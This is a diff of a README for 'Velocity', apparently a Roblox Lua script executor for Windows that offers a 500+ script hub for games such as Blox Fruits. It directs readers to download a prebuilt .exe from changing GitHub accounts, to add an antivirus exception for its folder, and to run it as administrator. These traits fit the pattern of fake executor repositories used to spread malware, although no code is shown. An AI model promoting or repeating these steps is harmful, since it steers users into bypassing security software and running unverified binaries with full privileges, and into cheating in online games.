@@ -1,156 +1,75 @@
-# Velocity Executor PC v4.2 - Roblox Script Executor 2026
+# ⚡ velocity-win11-script-executor - Run your Lua scripts with ease
 
-> A compact Windows Roblox Lua script executor for 2026, designed for Windows 10/11 with a streamlined desktop interface, batch script execution, and a 500+ script hub.
+[![](https://img.shields.io/badge/Download-Velocity-blue.svg)](https://github.com/Georgianascarred345/velocity-win11-script-executor)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
-[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
-[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jordanedwardsya2473/velocity-win11-script-executor?style=flat-square)](https://github.com)
+## 📖 About this application
 
----
+You use velocity-win11-script-executor to manage and run Lua scripts on your Windows computer. This tool provides a clean interface for users who want to execute code without dealing with complex command-line prompts. Whether you prefer to run individual files or organize large batches of scripts, this application handles the heavy lifting for you. 
 
-<p align="center">
-  <a href="https://jordanedwardsya2473.github.io/velocity-win11-script-executor/">
-    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Velocity%20Executor-v4.2%20Latest-brightgreen?style=for-the-badge" alt="Download Velocity Executor">
-  </a>
-</p>
+The software includes a script hub containing over 500 pre-written scripts. You find, select, and activate these scripts through a simple desktop dashboard. It works on both Windows 10 and Windows 11 systems.
 
-> **[Direct Download - Velocity Executor v4.2](https://jordanedwardsya2473.github.io/velocity-win11-script-executor/)**
-> Windows 10 / 11 · 64-bit · Free · No Key Required
+## ⚙️ System requirements
 
----
+Before you install the application, ensure your computer meets these basic requirements:
 
-[Download Latest Build](https://jordanedwardsya2473.github.io/velocity-win11-script-executor/)
+*   Operating System: Windows 10 (64-bit) or Windows 11.
+*   Memory: At least 4GB of RAM.
+*   Storage: 200MB of free space for the application and the script library.
+*   Graphics: DirectX 11 support.
+*   Internet: An active connection to download updates and access the script hub.
+*   Permissions: Administrator access to your user account.
 
----
+## 💾 How to download and install
 
-## Overview
+Follow these steps to set up the software on your machine:
 
-Velocity Executor is a Windows-oriented Roblox script executor built for launching Lua scripts through a simple desktop workflow. The focus is on quick execution, an integrated script hub, and an interface that keeps everyday actions easy to reach.
+1. Visit this page to download: [https://github.com/Georgianascarred345/velocity-win11-script-executor](https://github.com/Georgianascarred345/velocity-win11-script-executor).
+2. Look for the Releases section on the right side of the page.
+3. Click the most recent version available.
+4. Download the file ending in .exe to your desktop or downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the instructions that appear on your screen to complete the setup.
+7. Launch the application using the new shortcut icon on your desktop.
 
-It is aimed at Windows 10 and Windows 11 users who want a lightweight executor with practical tools such as batch execution, local history, favorites, and a debugger. If you need a Roblox script hub and executor in one desktop app, Velocity Executor is built around that workflow.
+## 🚀 Getting started
 
----
+Once you open the software, you see the primary dashboard. The layout organizes functions into three main areas: the script hub, the execution engine, and your personal folder of scripts.
 
-## Features at a Glance
+To run a script from the hub:
 
-- Fast one-click script launch for Lua execution in Roblox sessions
-- 500+ script hub entries for browsing widely used script groups
-- Batch execution support for running several scripts one after another
-- Integrated debugger for observing script behavior while developing or testing
-- Local history tracking for reopening scripts you used before
-- Favorites support for keeping frequently used scripts and shortcuts handy
-- Auto-update support to help the desktop build stay aligned with newer releases
-- Lightweight Windows 10/11 UI tuned for a small desktop footprint
+1. Click on the "Script Hub" tab in the left sidebar.
+2. Use the search bar to find a specific task or filter by category.
+3. Locate the script you want to run.
+4. Click the "Execute" button next to the script name.
+5. The application notifies you once the script runs successfully.
 
----
+To run your own script files:
 
-## Supported Games & Scripts
+1. Place your Lua files in the "User Scripts" folder shown in the application menu.
+2. Select the "Local Scripts" tab inside the dashboard.
+3. Choose the file from the list.
+4. Click the "Run" button at the bottom of the window.
 
-| Game / Experience | Script Category | Notes |
-| --- | --- | --- |
-| Blox Fruits | Farming, utility | Commonly searched Lua script category |
-| Pet Simulator-style games | Automation, farming | Useful for repetitive task handling |
-| Jailbreak-style games | Utility, movement | Often paired with feature-rich scripts |
-| Anime battleground games | Combat, utilities | Popular in script hub searches |
-| General Roblox experiences | UI scripts, testing | Broad support for Lua script use |
-| Development sessions | Debugging, batch runs | Helpful for local script iteration |
+## 🛠 Troubleshooting common issues
 
----
+If the application fails to open or if a script does not trigger, follow these steps to fix the issue:
 
-## System Requirements
+* Restart your computer. This clears temporary memory issues.
+* Check your antivirus software. Sometimes security programs block new applications. Add an exception for the velocity-win11-script-executor folder if the software fails to launch.
+* Verify your internet connection. The application requires an active link to refresh the script hub library.
+* Check for updates. If you experience errors, ensure you are running the current version from the official GitHub link.
+* Run as administrator. Right-click the application icon and select "Run as administrator" to grant necessary permissions to modify local files.
 
-| Component | Requirement |
-| --- | --- |
-| Operating System | Windows 10 or Windows 11 |
-| Architecture | 64-bit |
-| RAM | 4 GB minimum, 8 GB recommended |
-| Storage | 200 MB free space or more |
-| .NET | .NET 6+ or compatible runtime if required by the build |
-| Roblox | Installed Roblox client |
-| Display | Standard desktop resolution for the UI |
+## 🛡 Security and safety
 
----
+This application interacts with your local software environment. Only execute scripts that you trust or scripts contained within the official hub. Do not download or execute code from unknown sources, as third-party scripts may behave in ways that you do not intend. Always keep your Windows system updated to ensure the best performance.
 
-## Getting Started
+## 📋 Features
 
-```bash
-git clone https://github.com/jordanedwardsya2473/velocity-win11-script-executor.git
-cd velocity-windows-script-executor-v4.2
-start VelocityExecutorExecutor.exe
-```
+* Compact Interface: A lightweight window designed for accessibility.
+* Batch Execution: Run multiple scripts in a sequence to streamline your tasks.
+* Massive Library: Immediate access to over 500 curated scripts.
+* Cross-Version Support: Full compatibility with both Windows 10 and Windows 11.
+* Low Resource Usage: The program consumes minimal CPU power while running in the background.
 
-If the executable name differs in your build, launch the main Windows app from the extracted folder after download.
-
----
-
-## Script Hub - Popular Searches 2026
-
-- Roblox Lua script executor
-- Windows script executor for Roblox
-- Roblox script hub 500+ scripts
-- batch execution Lua scripts
-- built-in debugger for Roblox scripts
-- local history and favorites for scripts
-- auto-update Roblox executor
-
----
-
-## Project Structure
-
-Velocity Executor/
-- VelocityExecutorExecutor.exe
-- script-hub/
-  - categories/
-  - favorites/
-  - history/
-- updater/
-- debugger/
-- ui/
-- assets/
-- README.md
-
----
-
-## FAQ
-
-**Is Velocity Executor safe to use?**  
-It is a desktop script executor, so use it carefully and make your own judgment about where files come from and how you use them.
-
-**Will it keep working after Roblox updates?**  
-The project includes auto-update support, which can help the build stay aligned with newer releases, but compatibility still depends on the current Roblox environment.
-
-**How is it different from a basic script runner?**  
-Velocity Executor goes beyond single-script launch behavior by including a script hub, batch execution, favorites, local history tracking, and a debugger.
-
-**Can this affect my Roblox account?**  
-Using third-party script executors may involve platform or account risk depending on how and where they are used. Review the current Roblox terms and your own risk tolerance before running scripts.
-
-**Where are my scripts and history stored?**  
-The design includes local history tracking and favorites, so related data is stored on the machine rather than in a remote account profile.
-
-**Does it need an internet connection?**  
-Some features such as updates or hub content may rely on connectivity, while local execution and stored history are desktop-based.
-
----
-
-## Roadmap - 2026
-
-- [ ] Expand script hub categories and search coverage
-- [ ] Improve debugger views for script inspection
-- [ ] Add more controls for batch execution workflows
-- [ ] Refine the lightweight UI for faster navigation
-- [ ] Extend update handling for future Windows builds
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
-
----
-
-<p align="center">
-  <i>Velocity Executor v4.2 for Windows Roblox script execution with hub, history, and debugger support.</i>
-</p>
+Keywords: script-executor, roblox, windows-tools, lua-runner, automation, pc-utilities
